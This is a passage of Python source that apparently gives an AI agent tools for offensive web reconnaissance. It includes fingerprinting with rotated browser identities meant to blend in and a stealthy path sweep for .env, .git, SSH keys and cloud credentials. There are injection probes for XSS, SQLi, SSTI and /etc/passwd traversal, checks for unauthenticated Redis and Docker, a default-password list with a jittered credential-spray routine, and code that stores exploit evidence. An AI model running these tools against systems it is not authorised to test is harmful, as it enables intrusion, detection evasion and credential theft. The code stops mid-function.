        "subject": subject, "issuer": issuer, "not_after": not_after,
        "days_until_expiry": days_left, "san": sans,
        "findings": findings or ["no obvious TLS issues"],
    }


def tool_recon_http_fingerprint(args: dict) -> dict:
    """Fetch a URL and fingerprint the server: status, redirect chain, Server /
    X-Powered-By, page title, notable headers, and cookies. Read-only."""
    url = (args.get("url") or args.get("target") or "").strip()
    if not url:
        return {"error": "url required"}
    url = _recon_prep_url(url)
    timeout = max(2.0, min(float(args.get("timeout") or 8.0), 20.0))

    class _NoRedirect(urllib.request.HTTPRedirectHandler):
        def redirect_request(self, *a, **k):
            return None

    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    # Rotating real-browser identity (same stack as http_request) so the
    # fingerprint probe blends in instead of announcing a static old UA.
    _fp_headers = _browser_headers(_pick_profile(urllib.parse.urlparse(url).netloc))
    opener = urllib.request.build_opener(_NoRedirect, urllib.request.HTTPSHandler(context=ctx))
    chain = []
    cur = url
    final_headers = {}
    status = None
    body = ""
    for _ in range(6):
        req = urllib.request.Request(cur, headers=_fp_headers)
        try:
            resp = opener.open(req, timeout=timeout)
            status = resp.status
            final_headers = {k: v for k, v in resp.headers.items()}
            body = resp.read(20000).decode("utf-8", "replace")
            break
        except urllib.error.HTTPError as e:
            status = e.code
            loc = e.headers.get("Location")
            final_headers = {k: v for k, v in e.headers.items()}
            if loc and 300 <= e.code < 400 and len(chain) < 5:
                chain.append({"from": cur, "status": e.code, "to": loc})
                cur = urllib.parse.urljoin(cur, loc)
                continue
            break
        except Exception as e:
            return {"error": f"request failed: {e}", "url": cur}

    title = ""
    m = re.search(r"<title[^>]*>(.*?)</title>", body, re.IGNORECASE | re.DOTALL)
    if m:
        title = re.sub(r"\s+", " ", m.group(1)).strip()[:160]
    notable = {}
    for h in ("Server", "X-Powered-By", "X-AspNet-Version", "Via", "X-Generator",
              "Content-Type", "Strict-Transport-Security", "Content-Security-Policy"):
        for k, v in final_headers.items():
            if k.lower() == h.lower():
                notable[h] = v
                break
    cookies = [c.split(";")[0] for k, v in final_headers.items()
               if k.lower() == "set-cookie" for c in [v]]
    return {
        "url": url, "final_url": cur, "status": status,
        "title": title, "redirect_chain": chain,
        "server": notable.get("Server", ""),
        "powered_by": notable.get("X-Powered-By", ""),
        "notable_headers": notable, "cookies": cookies[:10],
    }


def tool_recon_subdomains(args: dict) -> dict:
    """Passive subdomain enumeration via certificate transparency logs
    (crt.sh). No active brute-forcing. Read-only."""
    domain = _recon_clean_host(args.get("domain") or args.get("target") or "")
    if not domain:
        return {"error": "domain required"}
    timeout = max(4.0, min(float(args.get("timeout") or 15.0), 30.0))
    url = f"https://crt.sh/?q=%25.{urllib.parse.quote(domain)}&output=json"
    try:
        req = urllib.request.Request(url, headers={"User-Agent": "accuretta-recon"})
        with urllib.request.urlopen(req, timeout=timeout) as r:
            rows = json.loads(r.read().decode("utf-8", "replace"))
    except Exception as e:
        return {"error": f"crt.sh query failed: {e}"}
    subs = set()
    for row in rows:
        for name in str(row.get("name_value", "")).splitlines():
            name = name.strip().lstrip("*.").lower()
            if name.endswith(domain) and name != domain:
                subs.add(name)
    return {
        "domain": domain, "count": len(subs),
        "subdomains": sorted(subs)[:300],
        "source": "certificate transparency (crt.sh) — passive",
    }


def tool_recon_dns(args: dict) -> dict:
    """Enumerate DNS records (A, AAAA, MX, NS, TXT, SOA, CNAME) via
    DNS-over-HTTPS. Read-only."""
    domain = _recon_clean_host(args.get("domain") or args.get("target") or "")
    if not domain:
        return {"error": "domain required"}
    records = {}
    for rtype in ("A", "AAAA", "MX", "NS", "TXT", "SOA", "CNAME"):
        try:
            ans = _recon_http_doh(domain, rtype)
            if ans:
                records[rtype] = ans[:50]
        except Exception:
            continue
    if not records:
        return {"error": f"no DNS records resolved for {domain}", "domain": domain}
    return {"domain": domain, "records": records, "source": "DNS-over-HTTPS (dns.google)"}


_RECON_UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
             "(KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36")


def _recon_fetch(url: str, timeout: float = 8.0, max_bytes: int = 8000) -> dict:
    """Single GET (TLS verification off so self-signed targets still respond).
    Returns {status, headers, body, url} or {error, url}."""
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    req = urllib.request.Request(url, headers={"User-Agent": _RECON_UA})
    opener = urllib.request.build_opener(urllib.request.HTTPSHandler(context=ctx))
    try:
        resp = opener.open(req, timeout=timeout)
        body = resp.read(max_bytes).decode("utf-8", "replace")
        return {"status": resp.status, "headers": {k: v for k, v in resp.headers.items()},
                "body": body, "url": resp.url}
    except urllib.error.HTTPError as e:
        body = ""
        try:
            body = e.read(max_bytes).decode("utf-8", "replace")
        except Exception:
            pass
        return {"status": e.code, "headers": {k: v for k, v in e.headers.items()},
                "body": body, "url": url}
    except Exception as e:
        return {"error": str(e), "url": url}


_RECON_COMMON_PATHS = [
    "admin/", "administrator/", "login", "wp-admin/", "wp-login.php",
    "phpmyadmin/", "manager/html", "console/", "dashboard/", "portal/",
    ".env", ".git/HEAD", ".git/config", ".svn/entries", ".DS_Store",
    "config.php", "config.json", "config.yml", "config.yaml", "settings.py",
    "web.config", "wp-config.php.bak", "wp-config.php~", "backup.zip",
    "backup.sql", "backup.tar.gz", "db.sql", "dump.sql", "database.sql",
    ".htaccess", ".htpasswd", "id_rsa", ".aws/credentials", "credentials.json",
    "robots.txt", "sitemap.xml", "server-status", "server-info", "status",
    "actuator", "actuator/health", "actuator/env", "actuator/heapdump",
    "metrics", "phpinfo.php", "info.php", "test.php", "debug", "trace",
    "api/", "api/v1/", "swagger.json", "swagger-ui/", "openapi.json",
    "graphql", ".well-known/security.txt", "graphiql",
    ".gitlab-ci.yml", "Dockerfile", "docker-compose.yml", ".github/workflows/",
]


# Highest-signal subset for quiet mode — a handful of the most likely wins so a
# stealthy sweep sends ~10 requests instead of ~50.
_RECON_QUIET_PATHS = [
    ".env", ".git/config", ".git/HEAD", "admin/", "login", "api/",
    "config.json", "backup.zip", "actuator/env", "robots.txt",
]


_RECON_WAF_MARKERS = [
    "attention required! | cloudflare", "/cdn-cgi/", "cf-error-details",
    "you have been blocked", "request blocked", "access denied",
    "ddos protection by cloudflare", "incapsula incident id", "akamai reference",
    "web application firewall", "forbidden - blocked",
]


def _recon_classify_body(status, headers, body):
    """Label a response so callers never mistake a block/SPA page for a finding:
    'waf_challenge' | 'html_page' | 'json' | 'other'."""
    ct = ""
    for k, v in (headers or {}).items():
        if k.lower() == "content-type":
            ct = (v or "").lower()
            break
    bl = (body or "").lower()
    if any(m in bl for m in _RECON_WAF_MARKERS):
        return "waf_challenge"
    head = bl[:300]
    if "<!doctype html" in head or "<html" in head:
        return "html_page"
    stripped = (body or "").lstrip()
    if ct.startswith("application/json") or stripped[:1] in ("{", "["):
        return "json"
    return "other"


def _recon_baseline(base, timeout):
    """Probe a guaranteed-nonexistent path to learn catch-all behavior. If the
    site returns 200 for garbage, bare 200s mean nothing and must be diffed."""
    rnd = "zz" + "".join(random.choice("abcdefghijklmnop0123456789") for _ in range(22)) + "/"
    r = _recon_fetch(urllib.parse.urljoin(base, rnd), timeout=timeout, max_bytes=6000)
    body = r.get("body", "") or ""
    return {"status": r.get("status"), "size": len(body), "body": body,
            "is_catchall": r.get("status") == 200,
            "classification": _recon_classify_body(r.get("status"), r.get("headers"), body)}


def _recon_same_as_baseline(r, baseline):
    """True if a response is effectively the catch-all page (same status, near
    identical size) — i.e. NOT a real distinct resource."""
    if not baseline.get("is_catchall"):
        return False
    body = r.get("body", "") or ""
    return r.get("status") == baseline.get("status") and abs(len(body) - baseline.get("size", 0)) < 64


def tool_recon_content_discovery(args: dict) -> dict:
    """AUTHORIZED RECON. Probe a base URL for a high-value path list. Establishes
    a catch-all baseline first (random path) so SPA/WAF sites that return 200 for
    everything don't produce false positives — only responses that DIFFER from
    the baseline (and aren't WAF challenges) are reported. Read-only."""
    base = (args.get("url") or args.get("target") or "").strip()
    if not base:
        return {"error": "url required"}
    base = _recon_prep_url(base)
    base = base.rstrip("/") + "/"
    timeout = max(2.0, min(float(args.get("timeout") or 6.0), 15.0))
    # Quiet mode: a small, highest-signal path set + low concurrency. A content
    # IDS scores REQUESTS (not timing), so a smaller footprint = fewer chances to
    # trip the "active scanning" signature. This is the stealth lever that
    # actually works against a content sensor (jitter does not).
    if args.get("quiet"):
        paths = args.get("wordlist") or list(_RECON_QUIET_PATHS)
        concurrency = 2
        jitter_ms = max(200, min(int(args.get("jitter_ms") or 200), 1000))
    else:
        paths = args.get("wordlist") or list(_RECON_COMMON_PATHS)
        concurrency = max(1, min(int(args.get("concurrency") or 6), 20))
        jitter_ms = max(0, min(int(args.get("jitter_ms") or 60), 1000))
    random.shuffle(paths)
    baseline = _recon_baseline(base, timeout)

    def probe(path):
        if jitter_ms:
            time.sleep(random.uniform(0, jitter_ms / 1000.0))
        r = _recon_fetch(urllib.parse.urljoin(base, path), timeout=timeout, max_bytes=6000)
        st = r.get("status")
        if not st or st == 404 or st >= 500:
            return None
        cls = _recon_classify_body(st, r.get("headers"), r.get("body"))
        if cls == "waf_challenge":
            return None  # blocked, not a real find
        if _recon_same_as_baseline(r, baseline):
            return None  # catch-all 200, not a distinct resource
        clen = r.get("headers", {}).get("Content-Length", "") or str(len(r.get("body", "") or ""))
        return {"path": path, "status": st, "size": clen, "type": cls,
                "url": urllib.parse.urljoin(base, path)}

    found = []
    with ThreadPoolExecutor(max_workers=concurrency, thread_name_prefix="recon-disc") as ex:
        for r in ex.map(probe, paths):
            if r:
                found.append(r)
    found.sort(key=lambda x: (x["status"], x["path"]))
    note = "non-404 responses that DIFFER from the catch-all baseline."
    if baseline["is_catchall"]:
        note += " NOTE: site returns 200 for unknown paths (SPA/catch-all) — a bare 200 is NOT proof a path exists."
    if baseline["classification"] == "waf_challenge":
        note += " A WAF/Cloudflare challenge is active; results may be filtered."
    return {"base": base, "tested": len(paths), "found_count": len(found),
            "catchall_detected": baseline["is_catchall"],
            "waf_detected": baseline["classification"] == "waf_challenge",
            "found": found, "note": note}


def tool_recon_check_exposure(args: dict) -> dict:
    """AUTHORIZED RECON. Targeted check for high-signal exposures and interprets
    them: readable .git, .env secrets, directory listing, Spring actuator,
    Apache server-status. Returns findings with severity + evidence. Read-only."""
    base = (args.get("url") or args.get("target") or "").strip()
    if not base:
        return {"error": "url required"}
    base = _recon_prep_url(base)
    base = base.rstrip("/") + "/"
    timeout = max(2.0, min(float(args.get("timeout") or 7.0), 15.0))
    findings = []
    baseline = _recon_baseline(base, timeout)

    def real(r):
        """A genuinely distinct 200 — not the catch-all page, not a WAF block."""
        if r.get("status") != 200 or "body" not in r:
            return False
        if _recon_same_as_baseline(r, baseline):
            return False
        if _recon_classify_body(r.get("status"), r.get("headers"), r.get("body")) == "waf_challenge":
            return False
        return True

    # exposed git repo — body must actually be a git ref, not HTML
    r = _recon_fetch(urllib.parse.urljoin(base, ".git/HEAD"), timeout)
    if real(r) and r["body"].strip().startswith("ref:"):
        findings.append({"severity": "high", "issue": "exposed .git repository",
                         "evidence": r["body"].strip()[:80],
                         "impact": "full source + history is reconstructable (git-dumper)."})
    # exposed env file — body must contain KEY=VALUE lines, not an HTML/SPA page
    r = _recon_fetch(urllib.parse.urljoin(base, ".env"), timeout)
    if real(r) and _recon_classify_body(r.get("status"), r.get("headers"), r["body"]) != "html_page" \
            and re.search(r"^[A-Z][A-Z0-9_]{2,}\s*=", r["body"], re.MULTILINE):
        keys = re.findall(r"^([A-Z][A-Z0-9_]{2,})\s*=", r["body"], re.MULTILINE)
        findings.append({"severity": "critical", "issue": "exposed .env file",
                         "evidence": "keys: " + ", ".join(keys[:8]),
                         "impact": "application secrets / credentials disclosed."})
    # spring actuator — body must actually be actuator JSON, not just a 200
    r = _recon_fetch(urllib.parse.urljoin(base, "actuator/env"), timeout)
    if real(r) and ('"propertySources"' in r["body"] or '"activeProfiles"' in r["body"]):
        findings.append({"severity": "high", "issue": "Spring Boot actuator/env exposed",
                         "evidence": "propertySources/activeProfiles present in JSON",
                         "impact": "configuration and secrets retrievable."})
    r = _recon_fetch(urllib.parse.urljoin(base, "actuator/heapdump"), timeout)
    cls = _recon_classify_body(r.get("status"), r.get("headers"), r.get("body"))
    if real(r) and cls not in ("html_page", "waf_challenge") and len(r.get("body", "")) > 2000:
        findings.append({"severity": "high", "issue": "Spring Boot actuator/heapdump exposed",
                         "evidence": "non-HTML binary heap dump served",
                         "impact": "full heap (secrets, sessions) retrievable."})
    # apache server-status — needs the actual status page signature
    r = _recon_fetch(urllib.parse.urljoin(base, "server-status"), timeout)
    if real(r) and "Apache Server Status" in r["body"]:
        findings.append({"severity": "medium", "issue": "Apache server-status exposed",
                         "evidence": "Apache Server Status page reachable",
                         "impact": "active requests, client IPs, internal vhosts disclosed."})
    # directory listing on the root
    r = _recon_fetch(base, timeout)
    if r.get("status") == 200 and re.search(r"<title>Index of /", r.get("body", ""), re.IGNORECASE):
        findings.append({"severity": "medium", "issue": "directory listing enabled",
                         "evidence": "Index of / autoindex page",
                         "impact": "filesystem contents browsable."})
    # .DS_Store — magic-byte validated
    r = _recon_fetch(urllib.parse.urljoin(base, ".DS_Store"), timeout, max_bytes=64)
    if r.get("status") == 200 and r.get("body", "").startswith("\x00\x00\x00\x01Bud1"):
        findings.append({"severity": "low", "issue": "exposed .DS_Store",
                         "evidence": "Bud1 magic present",
                         "impact": "directory/file names enumerable."})

    note = "validated exposures only (content-checked, baseline-diffed)."
    if baseline["is_catchall"]:
        note += " Site returns 200 for unknown paths (SPA/catch-all) — bare 200s were rejected."
    if baseline["classification"] == "waf_challenge":
        note += " A WAF/Cloudflare challenge is active."
    return {"base": base, "catchall_detected": baseline["is_catchall"],
            "waf_detected": baseline["classification"] == "waf_challenge",
            "finding_count": len(findings),
            "findings": findings or [{"severity": "info", "issue": "no validated high-signal exposures found"}],
            "note": note}


_RECON_TAKEOVER_FINGERPRINTS = [
    ("AWS S3", "NoSuchBucket"),
    ("AWS S3", "The specified bucket does not exist"),
    ("GitHub Pages", "There isn't a GitHub Pages site here"),
    ("Heroku", "No such app"),
    ("Heroku", "herokucdn.com/error-pages/no-such-app"),
    ("Fastly", "Fastly error: unknown domain"),
    ("Shopify", "Sorry, this shop is currently unavailable"),
    ("Surge.sh", "project not found"),
    ("Bitbucket", "Repository not found"),
    ("Ghost", "The thing you were looking for is no longer here"),
    ("Pantheon", "The gods are wise"),
    ("Tumblr", "Whatever you were looking for doesn't currently exist"),
    ("Readthedocs", "unknown to Read the Docs"),
    ("Wordpress", "Do you want to register"),
    ("Help Scout", "No settings were found for this company"),
]


def tool_recon_subdomain_takeover(args: dict) -> dict:
    """AUTHORIZED RECON. Check subdomains for dangling CNAME takeover: resolves
    the CNAME, fetches the host, matches known orphaned-service fingerprints.
    Read-only (no claiming performed)."""
    subs = args.get("subdomains")
    if isinstance(subs, str):
        subs = [subs]
    if not subs:
        one = args.get("domain") or args.get("target") or ""
        subs = [one] if one else []
    subs = [_recon_clean_host(s) for s in subs if s]
    if not subs:
        return {"error": "provide `subdomains` (list) or `domain`"}
    subs = subs[:80]
    timeout = max(2.0, min(float(args.get("timeout") or 7.0), 15.0))
    vulnerable = []
    checked = []

    for sub in subs:
        cnames = []
        try:
            cnames = _recon_http_doh(sub, "CNAME", timeout=6.0)
        except Exception:
            pass
        cname = cnames[0].rstrip(".") if cnames else ""
        body = ""
        for scheme in ("https://", "http://"):
            r = _recon_fetch(scheme + sub, timeout=timeout, max_bytes=4000)
            if "body" in r:
                body = r["body"]
                break
        hit = None
        for service, fp in _RECON_TAKEOVER_FINGERPRINTS:
            if fp.lower() in body.lower():
                hit = service
                break
        checked.append({"subdomain": sub, "cname": cname, "takeoverable": bool(hit)})
        if hit:
            vulnerable.append({"subdomain": sub, "cname": cname, "service": hit,
                               "evidence": f"orphaned-service fingerprint for {hit}"})
    return {"checked_count": len(checked), "vulnerable_count": len(vulnerable),
            "vulnerable": vulnerable, "checked": checked,
            "note": "fingerprint match = likely claimable. Confirm before reporting."}


def tool_recon_cve_match(args: dict) -> dict:
    """AUTHORIZED RECON. Map a component + version to known CVEs via OSV.dev.
    Best coverage for OSS packages (npm, PyPI, Go, Maven, etc.) — feed it the
    components you find in exposed package.json / requirements / JS libs."""
    name = (args.get("package") or args.get("product") or "").strip()
    if not name:
        return {"error": "package/product required"}
    version = (args.get("version") or "").strip()
    ecosystem = (args.get("ecosystem") or "").strip()
    query = {}
    if version:
        query["version"] = version
    pkg = {"name": name}
    if ecosystem:
        pkg["ecosystem"] = ecosystem
    query["package"] = pkg
    try:
        data = json.dumps(query).encode("utf-8")
        req = urllib.request.Request("https://api.osv.dev/v1/query", data=data,
                                     headers={"Content-Type": "application/json"})
        with urllib.request.urlopen(req, timeout=15) as r:
            res = json.loads(r.read().decode("utf-8", "replace"))
    except Exception as e:
        return {"error": f"OSV query failed: {e}"}
    vulns = []
    for v in (res.get("vulns") or [])[:40]:
        sev = ""
        for s in (v.get("severity") or []):
            sev = s.get("score", "") or sev
        vulns.append({"id": v.get("id"), "summary": (v.get("summary") or "")[:160],
                      "severity": sev, "aliases": (v.get("aliases") or [])[:5]})
    return {"package": name, "version": version, "ecosystem": ecosystem,
            "vuln_count": len(vulns), "vulns": vulns,
            "note": "OSV.dev — strongest for OSS packages; pass ecosystem for best precision."}


_RECON_SQL_ERRORS = [
    "sql syntax", "mysql_fetch", "you have an error in your sql",
    "warning: mysql", "unclosed quotation mark", "quoted string not properly terminated",
    "ora-0", "oracle error", "postgresql", "pg_query", "sqlite",
    "sqlstate", "odbc", "microsoft ole db", "syntax error at or near",
]


def tool_recon_injection_probe(args: dict) -> dict:
    """AUTHORIZED RECON. Non-destructive injection detection on URL query
    parameters: reflected XSS (marker reflected unencoded) and error-based SQLi
    (SQL error signatures after a quote). Sends benign probes only."""
    url = (args.get("url") or args.get("target") or "").strip()
    if not url:
        return {"error": "url required"}
    url = _recon_prep_url(url)
    parsed = urllib.parse.urlparse(url)
    qs = dict(urllib.parse.parse_qsl(parsed.query))
    names = args.get("params") or list(qs.keys())
    if not names:
        return {"error": "no query parameters to test — provide `params` or a URL with ?key=value",
                "hint": "e.g. https://site/search?q=test"}
    timeout = max(2.0, min(float(args.get("timeout") or 8.0), 15.0))
    marker = "acc" + "".join(random.choice("abcdefghijklmnopqrstuvwxyz0123456789") for _ in range(6))
    xss_payload = f"{marker}<svg/onload=1>"
    findings = []

    def build(param, value):
        newqs = dict(qs)
        newqs[param] = value
        return urllib.parse.urlunparse(parsed._replace(query=urllib.parse.urlencode(newqs)))

    for param in names:
        # reflected XSS
        r = _recon_fetch(build(param, xss_payload), timeout=timeout, max_bytes=20000)
        if "body" in r and xss_payload in r["body"]:
            findings.append({"param": param, "type": "reflected XSS",
                             "severity": "high", "evidence": "payload reflected unencoded"})
        elif "body" in r and marker in r["body"]:
            findings.append({"param": param, "type": "reflection (encoded)",
                             "severity": "info", "evidence": "marker reflected but encoded/sanitized"})
        # error-based SQLi
        r2 = _recon_fetch(build(param, "'\""), timeout=timeout, max_bytes=20000)
        body_l = (r2.get("body") or "").lower()
        hit = next((sig for sig in _RECON_SQL_ERRORS if sig in body_l), None)
        if hit:
            findings.append({"param": param, "type": "error-based SQLi",
                             "severity": "high", "evidence": f"SQL error signature: '{hit}'"})
        # SSTI: a distinctive arithmetic marker (1337*1337 = 1787569) that only
        # appears if the value is evaluated as a template. Try the common engine
        # syntaxes; require the RESULT present and the raw expression absent.
        for probe_val, engine in (("{{1337*1337}}", "jinja/twig"),
                                  ("${1337*1337}", "el/freemarker/spel"),
                                  ("<%= 1337*1337 %>", "erb/ejs")):
            rs = _recon_fetch(build(param, probe_val), timeout=timeout, max_bytes=20000)
            rb = rs.get("body") or ""
            if "1787569" in rb and probe_val not in rb:
                findings.append({"param": param, "type": "server-side template injection (SSTI)",
                                 "severity": "critical",
                                 "evidence": f"{probe_val} evaluated to 1787569 ({engine})"})
                break
        # path traversal / LFI: a classic /etc/passwd read
        rl = _recon_fetch(build(param, "../../../../../../etc/passwd"), timeout=timeout, max_bytes=20000)
        if re.search(r"root:.*:0:0:", rl.get("body") or ""):
            findings.append({"param": param, "type": "path traversal / LFI",
                             "severity": "high", "evidence": "/etc/passwd contents returned"})

    return {"url": url, "tested_params": names, "finding_count": len(findings),
            "findings": findings or [{"type": "none", "severity": "info",
                                       "note": "no reflected XSS or SQL errors observed"}]}


def _recon_tcp_cmd(host: str, port: int, payload: bytes, timeout: float = 4.0) -> bytes:
    """Open a TCP socket, send payload, return up to 4KB of response."""
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(timeout)
    try:
        s.connect((host, port))
        if payload:
            s.sendall(payload)
        return s.recv(4096)
    finally:
        try: s.close()
        except Exception: pass


def tool_recon_open_services(args: dict) -> dict:
    """AUTHORIZED RECON. Check for UNAUTHENTICATED data services exposed to the
    network: Redis, Elasticsearch, Docker API, Memcached. A live unauth hit is
    often a direct way in. Read-only probes."""
    host = _recon_clean_host(args.get("host") or args.get("target") or "")
    if not host:
        return {"error": "host required"}
    timeout = max(2.0, min(float(args.get("timeout") or 4.0), 10.0))
    findings = []

    # Redis (6379): PING should return +PONG if no auth
    try:
        resp = _recon_tcp_cmd(host, 6379, b"PING\r\n", timeout)
        if b"+PONG" in resp:
            findings.append({"service": "Redis", "port": 6379, "severity": "critical",
                             "state": "OPEN / no auth", "evidence": "+PONG to unauthenticated PING"})
        elif b"NOAUTH" in resp:
            findings.append({"service": "Redis", "port": 6379, "severity": "info",
                             "state": "present, auth required", "evidence": "NOAUTH response"})
    except Exception:
        pass
    # Elasticsearch (9200): root returns cluster JSON
    r = _recon_fetch(f"http://{host}:9200/", timeout)
    if r.get("status") == 200 and '"cluster_name"' in (r.get("body") or ""):
        findings.append({"service": "Elasticsearch", "port": 9200, "severity": "high",
                         "state": "OPEN / no auth", "evidence": "cluster info returned unauthenticated"})
    # Docker API (2375): /version
    r = _recon_fetch(f"http://{host}:2375/version", timeout)
    if r.get("status") == 200 and "ApiVersion" in (r.get("body") or ""):
        findings.append({"service": "Docker API", "port": 2375, "severity": "critical",
                         "state": "OPEN / no auth", "evidence": "/version returned — full host control"})
    # Memcached (11211): stats
    try:
        resp = _recon_tcp_cmd(host, 11211, b"stats\r\n", timeout)
        if b"STAT " in resp:
            findings.append({"service": "Memcached", "port": 11211, "severity": "high",
                             "state": "OPEN / no auth", "evidence": "stats returned unauthenticated"})
    except Exception:
        pass

    return {"host": host, "finding_count": len(findings),
            "findings": findings or [{"service": "none", "severity": "info",
                                       "state": "no exposed unauthenticated services found"}]}


_RECON_DEFAULT_CREDS = [
    ("admin", "admin"), ("admin", "password"), ("admin", "admin123"),
    ("admin", ""), ("admin", "123456"), ("admin", "changeme"),
    ("admin", "letmein"), ("root", "root"), ("root", "toor"),
    ("administrator", "administrator"), ("administrator", "password"),
    ("user", "user"), ("guest", "guest"), ("test", "test"),
    ("tomcat", "tomcat"), ("postgres", "postgres"), ("sa", "sa"),
]


def _recon_try_login(url, mode, user, pw, opts, timeout):
    """One login attempt. Returns (success: bool, status: int|None)."""
    import base64
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    opener = urllib.request.build_opener(urllib.request.HTTPSHandler(context=ctx))
    if mode == "basic":
        token = base64.b64encode(f"{user}:{pw}".encode()).decode()
        req = urllib.request.Request(url, headers={"User-Agent": _RECON_UA,
                                                   "Authorization": "Basic " + token})
        try:
            resp = opener.open(req, timeout=timeout)
            return resp.status not in (401, 403, 407), resp.status
        except urllib.error.HTTPError as e:
            return e.code not in (401, 403, 407), e.code
        except Exception:
            return False, None
    # form mode
    user_field = opts.get("user_field") or "username"
    pass_field = opts.get("pass_field") or "password"
    data = {user_field: user, pass_field: pw}
    data.update(opts.get("extra_fields") or {})
    body = urllib.parse.urlencode(data).encode()
    req = urllib.request.Request(url, data=body, headers={
        "User-Agent": _RECON_UA, "Content-Type": "application/x-www-form-urlencoded"})
    try:
        resp = opener.open(req, timeout=timeout)
        text = resp.read(20000).decode("utf-8", "replace")
        status, final_url = resp.status, resp.url
    except urllib.error.HTTPError as e:
        text = ""
        try:
            text = e.read(20000).decode("utf-8", "replace")
        except Exception:
            pass
        status, final_url = e.code, url
    except Exception:
        return False, None
    sm = opts.get("success_marker")
    fm = opts.get("fail_marker")
    if sm:
        return (sm.lower() in text.lower()), status
    if fm:
        return (fm.lower() not in text.lower()), status
    return (status in (301, 302, 303) or final_url != url), status


def tool_recon_auth_spray(args: dict) -> dict:
    """AUTHORIZED RECON ONLY. Credential spray / default-cred test against an
    HTTP login (basic or form). Rate-limited, attempt-capped, stops on first
    valid pair per user. For targets you are authorized to test."""
    url = (args.get("url") or args.get("target") or "").strip()
    if not url:
        return {"error": "url required"}
    url = _recon_prep_url(url)
    mode = (args.get("mode") or "basic").lower()
    if mode not in ("basic", "form"):
        return {"error": "mode must be 'basic' or 'form'"}
    timeout = max(2.0, min(float(args.get("timeout") or 8.0), 15.0))
    delay = max(0.0, min(float(args.get("delay") or 0.4), 5.0))

    users = args.get("usernames")
    passwords = args.get("passwords")
    if users and passwords:
        pairs = [(u, p) for u in users for p in passwords]
    elif users:
        common = ["admin", "password", "123456", "changeme", "letmein", ""]
        pairs = [(u, p) for u in users for p in common]
    else:
        pairs = list(_RECON_DEFAULT_CREDS)
    # dedupe, cap total attempts
    seen, capped = set(), []
    for pr in pairs:
        if pr not in seen:
            seen.add(pr)
            capped.append(pr)
    max_attempts = max(1, min(int(args.get("max_attempts") or 120), 300))
    capped = capped[:max_attempts]

    valid, attempts, done_users = [], 0, set()
    for (u, p) in capped:
        if u in done_users:  # already cracked this user, skip rest of their pairs
            continue
        if attempts:
            time.sleep(delay + random.uniform(0, delay))  # rate limit + jitter
        attempts += 1
        ok, status = _recon_try_login(url, mode, u, p, args, timeout)
        if ok:
            valid.append({"username": u, "password": p, "status": status})
            done_users.add(u)
    return {
        "url": url, "mode": mode, "attempts": attempts,
        "valid_count": len(valid), "valid": valid,
        "note": ("VALID CREDENTIALS FOUND — verify and capture evidence." if valid
                 else "no valid credentials in the tested set."),
    }


def tool_recon_capture_evidence(args: dict) -> dict:
    """AUTHORIZED RECON. Fetch a URL and store the response as a proof artifact
    under data/recon_evidence/ with a sha256 + snippet, so the report cites a
    real file instead of a claim."""
    import hashlib
    url = (args.get("url") or "").strip()
    if not url:
        return {"error": "url required"}
    if not url.startswith(("http://", "https://")):
        url = "https://" + _recon_clean_host(url)
    label = re.sub(r"[^A-Za-z0-9_.-]", "_", (args.get("label") or "evidence"))[:60]
    timeout = max(2.0, min(float(args.get("timeout") or 10.0), 20.0))
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    opener = urllib.request.build_opener(urllib.request.HTTPSHandler(context=ctx))
    req = urllib.request.Request(url, headers={"User-Agent": _RECON_UA})
    ctype = ""
    try:
        resp = opener.open(req, timeout=timeout)
        raw, status = resp.read(5_000_000), resp.status
        ctype = resp.headers.get("Content-Type", "")
    except urllib.error.HTTPError as e:
        try:
            raw = e.read(5_000_000)
        except Exception:
            raw = b""
        status = e.code
        try:
            ctype = e.headers.get("Content-Type", "")
        except Exception:
            ctype = ""
    except Exception as e:
        return {"error": f"capture failed: {e}", "url": url}

    evidence_dir = DATA / "recon_evidence"
    evidence_dir.mkdir(parents=True, exist_ok=True)
    ts = time.strftime("%Y%m%d-%H%M%S")
    host = _recon_clean_host(url)
    path = evidence_dir / f"{ts}_{label}_{host}.dat"
    try:
        path.write_bytes(raw)
    except Exception as e:
        return {"error": f"could not save evidence: {e}"}
    snippet_text = raw[:2000].decode("utf-8", "replace")
    classification = _recon_classify_body(status, {"Content-Type": ctype}, snippet_text)
    warning, likely = "", True
    if classification == "waf_challenge":
        warning = "captured content is a WAF/Cloudflare challenge page — NOT a real artifact. Do NOT report this as a finding."
        likely = False
    elif classification == "html_page":
        warning = "captured content is a generic HTML page (possibly the site's own index/SPA) — confirm it is actually sensitive before treating as evidence."
        likely = False
    return {
        "saved": str(path), "url": url, "status": status, "bytes": len(raw),
        "content_type": ctype, "classification": classification,
        "likely_evidence": likely, "warning": warning,
        "sha256": hashlib.sha256(raw).hexdigest(),
        "snippet": raw[:400].decode("utf-8", "replace"),
        "note": ("evidence stored — cite this artifact path + sha256 in the report." if likely
                 else "stored, but this does NOT look like a real artifact — see `warning`."),
    }


# Per-"session" cookie jars for http_request. Opt-in via the `session` arg so a
# model can carry auth across requests without re-passing cookies each time -
# while the default (no session) stays explicit so the cookie-tamper step is
# never hidden. Keyed by an arbitrary session name the model chooses.
_HTTP_SESSIONS: dict[str, dict] = {}


def _save_http_request_evidence(label, method, url, req_headers, req_body,
                                status, resp_headers, resp_body) -> dict | None:
    """Persist a full request+response transcript as a proof artifact under
    data/recon_evidence/ with a sha256. Unlike recon_capture_evidence (a bare
    GET), this captures the ACTUAL exploit request - forged cookies, POST body,
    injected payload - so a breach is verifiable and the report can cite it."""
    import hashlib
    evidence_dir = DATA / "recon_evidence"
    try:
        evidence_dir.mkdir(parents=True, exist_ok=True)
    except Exception:
        return None
    ts = time.strftime("%Y%m%d-%H%M%S")
    safe_label = re.sub(r"[^A-Za-z0-9_.-]", "_", str(label or "http_evidence"))[:60]
    host = re.sub(r"[^A-Za-z0-9_.-]", "_", urllib.parse.urlparse(url).netloc or "target")
    path = evidence_dir / f"{ts}_{safe_label}_{host}.txt"
    lines = ["### REQUEST", f"{method} {url}"]
    for k, v in (req_headers or {}).items():
